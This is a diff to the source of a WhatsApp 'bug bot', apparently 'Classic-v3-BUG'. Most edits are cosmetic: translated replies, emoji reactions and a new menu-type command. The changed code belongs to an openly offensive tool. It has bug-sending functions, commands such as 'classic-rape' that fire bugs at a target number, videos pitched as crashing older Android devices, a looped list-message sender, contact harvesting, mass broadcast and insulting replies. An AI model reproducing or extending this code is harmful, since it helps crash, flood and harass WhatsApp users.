@@ -98,7 +98,7 @@ const hmbug = async (target, txt) => {
       title: txt
     }
   }
-  zetsubo.relayMessage(target, etc, {})
+  zetsubo.reply(target, etc, {})
   await sleep(300);
 }
 
@@ -374,12 +374,12 @@ reply(`${err}`)
 }
 }
 	 
-const moji = ['💔', '🥰', '🌏', '🫂', '😹', '🌝', '🤳',]
+const moji = ['💔', '💀', '🌏', '💢', '🩸', '🥳', '✅',]
 const randomemoji = moji[Math.floor(Math.random() * moji.length)]
 
 //Reaction
 const inireact = async () => {
-  const emojis = ["💦", "🕳️", "🔥", "💫", "👁️", "👀", "👽", "👾"];
+  const emojis = ["🤡", "🤯", "🔥", "💫", "👁️", "👀", "👽", "👾"];
   
   for (const emoji of emojis) {
     await sleep(80);
@@ -898,18 +898,27 @@ break
 //=================================================//
 case "getcase":
 if (!isCreator) return reply('*𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐮𝐬𝐞𝐫𝐬 𝐨𝐧𝐥𝐲*')
-await loading()
-if (!args[0]) return m.reply("Mau ngambil case apa?")
+await inireact()
+if (!args[0]) return m.reply("What case do you want to take?")
 try{
 zetsreply(getCase(args[0]))
 } catch {
-m.reply("Case Tidak Ditemukan")
+m.reply("Case not found")
 }
+break
+		
+//=================================================//
+case "menutype":
+if (!isCreator) return reply('*𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐮𝐬𝐞𝐫𝐬 𝐨𝐧𝐥𝐲*')
+await inireact()
+if (!args[0]) return reply(`Choose between\nV1 - Photo\nV2 - Video\nV3 - Text\nV4 - Button`)
+let chosen = args[0]
+global.menutype = chosen
+await reply(`Successfully set Menu type to ${chosen} 🤩`)
 break
 //=================================================//
 case 'menu': case 'help': {
-await inireact()	
-let menutxt = `
+let messg = `
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
     \`𝘾𝙇𝘼𝙎𝙎𝙄𝘾-𝙑3 𝘽𝙐𝙂\`
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
@@ -925,138 +934,9 @@ let menutxt = `
  
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-©𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 © 𝙲𝚕𝚊𝚜𝚜𝚒𝚌 𝙱𝚘𝚝 𝙰𝚍𝚖𝚒𝚗𝚜`
+©𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 `
 
 /*try {
-let msg = generateWAMessageFromContent(from, {
-  viewOnceMessage: {
-    message: {
-        "messageContextInfo": {
-          "deviceListMetadata": {},
-          "deviceListMetadataVersion": 2
-        },
-        interactiveMessage: proto.Message.InteractiveMessage.create({
-          body: proto.Message.InteractiveMessage.Body.create({
-            text: menutxt
-          }),
-          footer: proto.Message.InteractiveMessage.Footer.create({
-            text: "Classic-v3-BUG"
-          }),
-          header: proto.Message.InteractiveMessage.Header.create({
-                ...(await prepareWAMessageMedia({ image : { url: "https://telegra.ph/file/6dfde4263655a81572a68.jpg" }}, { upload: zetsubo.waUploadToServer})),
-                  title: ``,
-                  gifPlayback: true,
-                  subtitle: "𝕶𝖎𝖓𝖌 𝕾𝖆𝖓",
-                  hasMediaAttachment: false
-                }),
-          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
-            buttons: [
-              {
-                "name": "single_select",
-                "buttonParamsJson":
-`{"title":"MENU🗒️",
-"sections":[{"title":" 🎩𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆🧣",
-"rows":[{"header":"🔖 𝙰𝙳𝙳 𝙼𝙴𝙽𝚄 🔖",
-"title":"",
-"description":"Addmenu 🕷️",
-"id":".addmenu"},
-{"header":"📔𝐕𝐂𝐅 𝐌𝐄𝐍𝐔 🪡",
-"title":"",
-"description":"Pushmenu 👁️",         
-"id":".pushmenu"},
-{"header":"🐬 𝐅𝐔𝐍 𝐌𝐄𝐍𝐔 🐳",
-"title":"",
-"description":"Funmenu 💫",
-"id":".funmenu"},
-{"header":"🌪️ 𝐏𝐈𝐍𝐆 🪐",
-"title":"",
-"description":"Ping ⚡",
-"id":".ping"},
-{"header":" 🎧 𝐌𝐔𝐒𝐈𝐂 𝐌𝐄𝐍𝐔 🎤",
-"title":"",
-"description":"Listmusik 🎉",
-"id":".listmusik"},
-{"header":"🛹 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐌𝐄𝐍𝐔 ⛷",
-"title":"",
-"description":"Downloadmenu 🪀",
-"id":".downloadmenu"},
-{"header":"🪃 𝐆𝐀𝐌𝐄 𝐌𝐄𝐍𝐔 ⛳",
-"title":"",
-"description":"Gamemenu 🥳",
-"id":".gamemenu"},
-{"header":"RANDOM MENU",
-"title":"",
-"description":"List Random Commands",
-"id":".randommenu"},
-{"header":" 🥌 𝐀𝐋𝐈𝐕𝐄 🤸‍♂️",
-"title":"",
-"description":"Alive 🌛",
-"id":".alive"},
-{"header":"🌘 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔 🌑",
-"title":"",
-"description":"GROUPMENU 🫴",
-"id":".groupmenu"},
-{"header":"👤 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 👤",
-"title":"",
-"description":"Ownermenu 🤖",
-"id":".ownermenu"},
-{"header":"☄️𝐑𝐔𝐍𝐓𝐈𝐌𝐄 💥",
-"title":"",
-"description":"Runtime",
-"id":".runtime"},
-{"header":"🗣️𝐎𝐖𝐍𝐄𝐑 🕊️",
-"title":"",
-"description":".owner",
-"id":".owner"},
-{"header":"🗿 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 🦋",
-"title":"",                                   
-"description":"Bugmenu 👾",
-"id":".bugmenu"}]
-}]
-}`
-              },
-                     {
-                        "name": "cta_url",
-                        "buttonParamsJson": "{\"display_text\":\"𝐑𝐞𝐩𝐨🔗\",\"url\":\"https://github.com/Samue-l1/Classic-v3-BUG\",\"merchant_url\":\"https://github.com/Samue-l1/Classic-v3-BUG\"}"
-                      },
-		      {
-                        "name": "cta_url",
-                        "buttonParamsJson": "{\"display_text\":\"𝐂𝐡𝐚𝐧𝐧𝐞𝐥📍 \",\"url\":\"https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e\"}"
-		      },
-		      {
-                       "name": "cta_url",
-                        "buttonParamsJson": "{\"display_text\":\"𝐎𝐰𝐧𝐞𝐫👤 \",\"url\":\"https://wa.me/+254742491666?text=Hello+King+Sam\",\"merchant_url\":\"https://wa.me/+254742491666?text=Hello+King+Sam\"}"
-		      },
-		      {
-                        "name": "cta_url",
-                        "buttonParamsJson": "{\"display_text\":\"𝐇𝐨𝐰 𝐓𝐨 𝐃𝐞𝐩𝐥𝐨𝐲 📺\",\"url\":\"https://youtube.com/@king_sam_hub\",\"merchant_url\":\"https://youtube.com/@king_sam_hub\"}"
-		}],
-          }),
-          contextInfo: {
-                  mentionedJid: [m.sender],
-                  forwardingScore: 999,                                         
-		  isForwarded: true,
-                  forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363288746972771@newsleter',
-                  newsletterName: "Classic-v3-BUG",
-                  serverMessageId: 143
-                }
-                }
-        })
-    }
-  }
-}, {})
-
-await zetsubo.relayMessage(msg.key.remoteJid, msg.message, {
-  messageId: msg.key.id
-})
-	} catch (error) {
-          console.error('Error generating and relaying message:', error);
-          return reply('Error generating and relaying message.');
-}
-
-}*/
-try {
 let msg = generateWAMessageFromContent(m.key.remoteJid, {
             viewOnceMessage: {
               message: {
@@ -1123,7 +1003,93 @@ let msg = generateWAMessageFromContent(m.key.remoteJid, {
           console.error('Error generating and relaying message:', error);
           return reply('Error generating and relaying message.');
 	}
-} 
+} */
+global.logo = "https://telegra.ph/file/6dfde4263655a81572a68.jpg"
+global.vidmenu = "https://telegra.ph/file/05ebf02a511b7d36bd20d.mp4"
+if(menutype === "v1") {
+        let buttonMessage = {
+        image: { url: global.logo },
+        caption: messg
+        }
+        await zetsubo.sendMessage(from, buttonMessage)
+} else if (menutype === "v2"){
+        let buttonMessage = {
+        video: { url: global.vidmenu},
+        caption: messg
+        }
+        await zetsubo.sendMessage(from, buttonMessage)
+} else if (menutype === "v3") {
+        await zetsubo.sendMessage(from, { text: messg })
+} else if (menutype === "v4") {
+  try {
+      let msg = generateWAMessageFromContent(m.key.remoteJid, {
+            viewOnceMessage: {
+              message: {
+                "messageContextInfo": {
+                  "deviceListMetadata": {},
+                  "deviceListMetadataVersion": 2
+                },
+                interactiveMessage: proto.Message.InteractiveMessage.create({
+                  body: proto.Message.InteractiveMessage.Body.create({
+                    text: msssg,
+                  }),
+                  footer: proto.Message.InteractiveMessage.Footer.create({
+                    text: "King Sam"
+                  }),
+                  header: proto.Message.InteractiveMessage.Header.create({
+                    ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/6dfde4263655a81572a68.jpg' } }, { upload: zetsubo.waUploadToServer })),
+                    title: "",
+                    subtitle: "Classic-v3-BUG",
+                    hasMediaAttachment: false
+                  }),
+                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                    buttons: [
+                       {
+                        "name": "quick_reply",
+                        "buttonParamsJson": `{"display_text":"MENU List🚀","id":"${prefix}taira"}`
+                       },
+                        {
+                        "name": "quick_reply",
+                        "buttonParamsJson": `{"display_text":"PING 💤","id":"${prefix}ping"}`
+                        },
+                        {
+                        "name": "quick_reply",
+                        "buttonParamsJson": `{"display_text":"☄️𝐑𝐔𝐍𝐓𝐈𝐌𝐄 💥","id":"${prefix}runtime"}`
+                        },
+                      {
+                        "name": "cta_url",
+                        "buttonParamsJson": "{\"display_text\":\"𝐂𝐡𝐚𝐧𝐧𝐞𝐥📍 \",\"url\":\"https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e\"}"
+                      },
+                      {
+                       "name": "cta_url",
+                        "buttonParamsJson": "{\"display_text\":\"𝐎𝐰𝐧𝐞𝐫 👤 \",\"url\":\"https://wa.me/+254742491666?text=Hello+King+Sam\",\"merchant_url\":\"https://wa.me/+254742491666?text=Hello+King+Sam\"}"
+                      },
+                      {
+                        "name": "cta_url",
+                        "buttonParamsJson": "{\"display_text\":\"𝐇𝐨𝐰 𝐓𝐨 𝐃𝐞𝐩𝐥𝐨𝐲 📺\",\"url\":\"https://youtube.com/@king_sam_hub\",\"merchant_url\":\"https://youtube.com/@king_sam_hub\"}"
+                      },
+                    ]
+                  })
+                })
+              }
+            }
+          }, {});
+
+          if (!msg || !msg.key || !msg.key.remoteJid || !msg.key.id) {
+            const errorMessage = 'Error: Invalid message key.';
+            console.error(errorMessage);
+            return reply(errorMessage);
+          }
+
+          await zetsubo.relayMessage(msg.key.remoteJid, msg.message, {
+            messageId: msg.key.id
+          });
+        } catch (error) {
+          console.error('Error generating and relaying message:', error);
+          return reply('Error generating and relaying message.');
+        }
+} else return
+}
 break
 //=================================================//
 case 'taira': {
@@ -1141,7 +1107,7 @@ let msg = generateWAMessageFromContent(m.key.remoteJid, {
                     text: "Click Me 🚀",
                   }),
                   footer: proto.Message.InteractiveMessage.Footer.create({
-                    text: "𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 "
+                    text: "𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 || ᴸᴼᴿᴰᴛᴀɪʀᴀ"
                   }),
                   header: proto.Message.InteractiveMessage.Header.create({
 		   ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/6dfde4263655a81572a68.jpg' } }, { upload: zetsubo.waUploadToServer })),
@@ -2212,8 +2178,8 @@ zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 //=================================================//
 case 'funmenu':
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+await inireact()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
 let fooutgkzz = `Runtime : ⏳ ${runtime(process.uptime())}`
 sendGeekzMessage(from, { 
 text: `Hay Kak ${pushname} ${salam2}
@@ -2264,8 +2230,8 @@ mentionedJid:[sender],
 })
 break
 case 'gamemenu':
-await loading()
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
+await inireact()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
 let fooutgdhsikzz = `Runtime : ⏳ ${runtime(process.uptime())}`
 sendGeekzMessage(from, { 
 text: `Hay Kak ${pushname} ${salam2}
@@ -2332,6 +2298,7 @@ zetsreply(`*_Semua pesan telah dikirim!:_* *_✓_*\n*_Jumlah pesan terkirim:_* *
 break;
 //=================================================//
 case "cekidgc": {
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*') 
 reply('Bentar Ya')
 let getGroups = await zetsubo.groupFetchAllParticipating()
@@ -2400,6 +2367,7 @@ fs.writeFileSync("./pushkont/contacts.json", JSON.stringify(contacts))
 }
 break
 case "savekontakid": {
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*') 
 if (!text) return m.reply(`GAK GITU CARANYA BEGO!!
 KEK GINI CARANYA = 
@@ -2446,6 +2414,7 @@ fs.writeFileSync("./pushkont/contacts.json", JSON.stringify(contacts))
 break
 //=================================================//
 case 'public': {
+await inireact()
 if (!isCreator) return reply('*Premium Command*') 
 zetsubo.public = true
 zetsreply('Sukse Change To Public')
@@ -2453,6 +2422,7 @@ zetsreply('Sukse Change To Public')
 break
 //=================================================//
 case 'self': {
+await inireact()
 if (!isCreator) return reply('*Premium Command*') 
 zetsubo.public = false
 zetsreply('Sukses Change To Self')
@@ -2460,6 +2430,7 @@ zetsreply('Sukses Change To Self')
 break
 //=================================================//
 case 'addprem':
+await inireact()
 if (!isCreator) return reply('*Premium Command*')
 if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 258869103969`)
 bnnd = text.split("|")[0].replace(/[^0-9]/g, '')
@@ -2471,6 +2442,7 @@ zetsreply(`Nomor ${bnnd} Telah Sudah Premium!!!`)
 break
 //=================================================//
 case 'delprem':
+await inireact()
 if (!isCreator) return reply('*Premium Command*')
 if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 258869103969`)
 yaki = text.split("|")[0].replace(/[^0-9]/g, '')
@@ -2481,6 +2453,7 @@ zetsreply(`Nomor ${yaki} Telah Di Hapus Dari Premium!!!`)
 break
 //=================================================//
 case 'listprem':
+await inireact()
 if (isBan) return reply('*Lu Di Ban Owner*')
  teksooo = '*List Premium*\n\n'
 for (let i of owner) {
@@ -2524,25 +2497,10 @@ zetsreply(teksooop)
 break
 //=================================================//
 case 'owner': case 'creator':{
+await inireact()
  zetsubo.sendContact(from, global.owner, m)
 }
 break
-//=================================================//
-
-//===========================================		
-
-//=================================================//
-
-//=================================================//
-
-//=================================================//
-//=================================================//
-
-
-//=================================================//
-
-//=================================================//
-
 //=================================================//
 case 'classic-rape':
 case 'police-case':
@@ -2599,6 +2557,7 @@ reply(mess.bugrespon + `\n❗Detail > \n🎯 Target Number : ${sendto} \n😎Bug
 break
 
 case 'buglist': {
+await inireact()
 for (let i = 0; i < 10; i++) {
  let sections = [{
     title: `Ah ah ah`,
@@ -2636,43 +2595,45 @@ break
 //=================================================//
 case 'Classic': {
 if (!isCreator) return m.reply(`*Only Premium Members Are Allowed To Use This Command*`)
-await loading()
+await inireact()
 joauu = fs.readFileSync('./zetszet/video/hwmods.mp4')
 zetsubo.sendMessage(from, { video: joauu, mimetype: 'video/mp4', caption: `APA ?? BERANI LIAT VIDEO INI GA ? AH LEMAH TAPI KHUSUS ANDROID 11 KEBAWAH DENG ` }, {quoted:kalgans})
 }
 break
 //=================================================//
-case 'goyang': {
+case 'classic-vid': {
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-await loading() //Variable yg tadi
+await inireact() //Variable yg tadi
 joauuuuu = fs.readFileSync('./zetszet/video/hwmods2.mp4')
 zetsubo.sendMessage(from, { video: joauuuuu, mimetype: 'video/mp4', caption: `APA ?? BERANI LIAT VIDEO INI GA ? AH LEMAH TAPI KHUSUS ANDROID 11 KEBAWAH DENG ` }, {quoted:kalgans})
 }
 break
 //=================================================//
-case 'linkgroup': case 'linkgc': {
+case 'invite': case 'link': {
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-if (!m.isGroup) return reply('Buat Di Group Bodoh')
+if (!m.isGroup) return reply('Make it in the Stupid Group')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
-await loading()
+await inireact()
 let response = await zetsubo.groupInviteCode(from)
 zetsubo.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
 }
 break
 //=================================================//
-case 'resetlinkgc':
+case 'resetlink':
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-if (!m.isGroup) return reply('Buat Di Group Bodoh')
+if (!m.isGroup) return reply('Make it in the Stupid Group')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
-await loading()
+await inireact()
 zetsubo.groupRevokeInvite(from)
 break
 //=================================================//
 case 'sendlinkgc': {
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-if (!m.isGroup) return reply('Buat Di Group Bodoh')
-if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
-await loading()
+if (!m.isGroup) return reply('sendimg link')
+if (!isBotAdmins) return reply('Here is the link')
+await inireact()
 if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6289503267904`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
 let response = await zetsubo.groupInviteCode(from)
@@ -2683,52 +2644,56 @@ break
 //=================================================//
 case 'kick': {
 if (!isCreator) return reply('*Premium Only*')
-if (!m.isGroup) return reply('Buat Di Group Bodoh')
+if (!m.isGroup) return reply('Make it in the Stupid Group')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
-if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
-await loading()
+if (!isAdmins) return reply('Considered Admin Group')
+await inireact()
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await zetsubo.groupParticipantsUpdate(from, [users], 'remove')
 }
 break
 //=================================================//
 case 'add': {
+await inireact()
 if (!isCreator) return reply('*Premium Only*')
-if (!m.isGroup) return reply('Buat Di Group Bodoh')
+if (!m.isGroup) return reply('Make it in the Stupid Group')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
-if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
-await loading()
+if (!isAdmins) return reply('Considered Admin Group')
+await inireact()
 let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await zetsubo.groupParticipantsUpdate(from, [users], 'add')
 }
 break
 //=================================================//
 case 'promote': {
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-if (!m.isGroup) return reply('Buat Di Group Bodoh')
+if (!m.isGroup) return reply('Make it in the Stupid Group')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
-if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
-await loading()
+if (!isAdmins) return reply('Considered Admin Group')
+await inireact()
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await zetsubo.groupParticipantsUpdate(from, [users], 'promote')
 }
 break
 //=================================================//
 case 'demote': {
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-if (!m.isGroup) return reply('Buat Di Group Bodoh')
+if (!m.isGroup) return reply('Make it in the Stupid Group')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
-if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
-await loading()
+if (!isAdmins) return reply('Considered Admin Group')
+await inireact()
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await zetsubo.groupParticipantsUpdate(from, [botNumber], 'demote')
 }
 break
 //=================================================//
 case 'hidetag': {
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-if (!m.isGroup) return reply('Buat Di Group Bodoh')
-await loading()
+if (!m.isGroup) return reply('Make it in the Stupid Group')
+await inireact()
 zetsubo.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
 }
 break
@@ -2738,8 +2703,9 @@ case 'ttp2':
 case 'ttp3':
 case 'ttp4':
 case 'attp':
+await inireact()
 if (isBan) return reply('*Lu Di Ban Owner*')
-await loading()
+await inireact()
 if (args.length == 0) return reply(`Example: ${prefix + command} Znxn Xyz`)
 ini_txt = args.join(" ")
 ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=haikallgans&text=${ini_txt}`)
@@ -2747,10 +2713,11 @@ zetsubo.sendMessage(from, { sticker : ini_buffer }, { quoted:m })
 break
 //=================================================
 case 'editgroup': {   
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-if (!m.isGroup) return reply('Buat Di Group Bodoh')
-if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
-await loading()
+if (!m.isGroup) return reply('Make it in the Stupid Group')
+if (!isAdmins) return reply('Considered Admin Group')
+await inireact()
 if (args[0] === 'close'){
 await zetsubo.groupSettingUpdate(from, 'announcement').then((res) => reply(`Sukses Menutup Group`)).catch((err) => reply(jsonformat(err)))
 } else if (args[0] === 'open'){
@@ -2764,10 +2731,11 @@ Group Close`}, {quoted:m})
 break
 //=================================================//
 case 'editinfo': {
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-if (!m.isGroup) return reply('Buat Di Group Bodoh')
-if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
-await loading()
+if (!m.isGroup) return reply('Make it in the Stupid Group')
+if (!isAdmins) return reply('Considered Admin Group')
+await inireact()
  if (args[0] === 'open'){
 await zetsubo.groupSettingUpdate(from, 'unlocked').then((res) => reply(`Sukses Membuka Edit Info Group`)).catch((err) => reply(jsonformat(err)))
  } else if (args[0] === 'close'){
@@ -2782,55 +2750,61 @@ Editinfo Close`}, {quoted:m})
 break
 //=================================================//
 case 'join': {
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 if (!text) throw 'Masukkan Link Group!'
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
-await loading()
+await inireact()
 let result = args[0].split('https://chat.whatsapp.com/')[1]
 await zetsubo.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 }
 break
 //=================================================//
-case 'editsubjek': {
+case 'editsubject': {
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-if (!m.isGroup) return reply('Buat Di Group Bodoh')
+if (!m.isGroup) return reply('Make it in the Stupid Group')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
-if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
+if (!isAdmins) return reply('Considered Admin Group')
 if (!text) throw 'Text nya ?'
-await loading()
+await inireact()
 await zetsubo.groupUpdateSubject(from, text).then((res)).catch((err) => reply(jsonformat(err)))
 }
 break
 //=================================================//
 case 'editdesk':{
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-if (!m.isGroup) return reply('Buat Di Group Bodoh')
+if (!m.isGroup) return reply('Make it in the Stupid Group')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
-if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
+if (!isAdmins) return reply('Considered Admin Group')
 if (!text) throw 'Text Nya ?'
-await loading()
+await inireact()
 await zetsubo.groupUpdateDescription(from, text).then((res)).catch((err) => reply(jsonformat(err)))
 }
 break
 //=================================================//
 case 'tagall': {
+await inireact()
+if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 if (!m.isGroup) return
-await loading()
+await inireact()
 let teks = `══᪣⧠ *࿉ 𝐂𝐋𝐀𝐒𝐒𝐈𝐂 𝐕-3࿉* ⧠᪣══
  ➲ *REPORT : ${q ? q : '𝐓𝐀𝐆𝐆𝐄𝐃'}*\n\n`
 for (let mem of participants) {
-teks += `🎲 @${mem.id.split('@')[0]}\n`
+teks += `🩸 @${mem.id.split('@')[0]}\n`
 }
 zetsubo.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:m })
 }
 break
 //=================================================//
 case'demoteall':
+await inireact()
 if (!isCreator) return reply('*Premium Only*')
-if (!m.isGroup) return reply('Buat Di Group Bodoh')
+if (!m.isGroup) return reply('Make it in the Stupid Group')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
-if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
-await loading()
+if (!isAdmins) return reply('Considered Admin Group')
+await inireact()
 var groupe = await zetsubo.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
@@ -2842,10 +2816,10 @@ break
 //=================================================//
 case'promoteall':
 if (!isCreator) return reply('*Premium Only*')
-if (!m.isGroup) return reply('Buat Di Group Bodoh')
+if (!m.isGroup) return reply('Make it in the Stupid Group')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
-if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
-await loading()
+if (!isAdmins) return reply('Considered Admin Group')
+await inireact()
 var groupe = await zetsubo.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
@@ -2856,26 +2830,26 @@ zetsubo.groupParticipantsUpdate(from, mems, 'promote')
 break
 //=================================================//
 case 'sticker': case 's': case 'stickergif': case 'sgif': {
- if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
+if (!quoted) throw `reply Video/Image D Caption ${prefix + command}`
 if (/image/.test(mime)) {
-await loading()
 let media = await quoted.download()
 let encmedia = await zetsubo.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })
 await fs.unlinkSync(encmedia)
 } else if (/video/.test(mime)) {
-if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
+if ((quoted.msg || quoted).seconds > 11) return reply('more than 10 sec!')
 let media = await quoted.download()
 let encmedia = await zetsubo.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author })
 await fs.unlinkSync(encmedia)
 } else {
-throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
+throw `Reply to video${prefix + command}\n Video 1-9 seconds`
 }
 }
 break
 //=================================================//
 case 'inspect': {
+await inireact()
 if (isBan) return reply('*Lu Di Ban Owner*')
-await loading()
+await inireact()
 if (!args[0]) return reply("Linknya?")
 let linkRegex = args.join(" ")
 let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
@@ -2911,7 +2885,8 @@ zetsubo.sendFile(from, pp, "", m, { caption: tekse, mentions: await zetsubo.pars
 }
 break
 //=================================================
-case 'bugggg': { 
+case 'bugggg': {
+await inireact()
 if (isBan) return reply('*Lu Di Ban Owner*')
 joauuuuuuu = fs.readFileSync('./zetszet/video/hwmods2.mp4')
 zetsubo.sendMessage(m.chat, {video: joauuuuuuu, caption:`selamat datang`,viewOnce : true},{quoted:m })
@@ -2919,10 +2894,11 @@ zetsubo.sendMessage(m.chat, {video: joauuuuuuu, caption:`selamat datang`,viewOnc
 break
 //=================================================
 case "welcome":
+await inireact()
 {
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-if (!m.isGroup) return reply('Buat Di Group Bodoh')
-await loading()
+if (!m.isGroup) return reply('Make it in the Stupid Group')
+await inireact()
 if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
 if (args[0] === "on") {
 if (welcm) return reply('Sudah Aktif')
@@ -2945,7 +2921,7 @@ break
 //=================================================
 case 'bcgc': case 'bcgroup': {
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
 if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
 let getGroups = await zetsubo.groupFetchAllParticipating()
 let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
@@ -2960,28 +2936,30 @@ reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
 break
 //=================================================//
 case 'antilink': {
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-if (!m.isGroup) return reply('Buat Di Group Bodoh')
+if (!m.isGroup) return reply('Make it in the Stupid Group')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
-if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
-await loading()
+if (!isAdmins) return reply('Considered Admin Group')
+await inireact()
 if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
 if (args[0] === "on") {
 if (AntiLink) return reply('Sudah Aktif')
 ntilink.push(from)
-reply('Succes menyalakan antilink di group ini 🌷')
+reply('Antilink is on🌷')
 } else if (args[0] === "off") {
 if (!AntiLink) return reply('Sudah Mati')
 let off = ntilink.indexOf(from)
 ntilink.splice(off, 1)
-reply('Succes mematikan antilink di group ini 🌷')
+reply('Succes antilink off🌷')
 } else {
-reply('on untuk mengaktifkan, off untuk menonaktifkan')
+reply('🩸')
 }
 }
 break
 //=================================================
 case 'autodelete': {
+await inireact()
 if (!isCreator) return
 if (args.length < 1) return
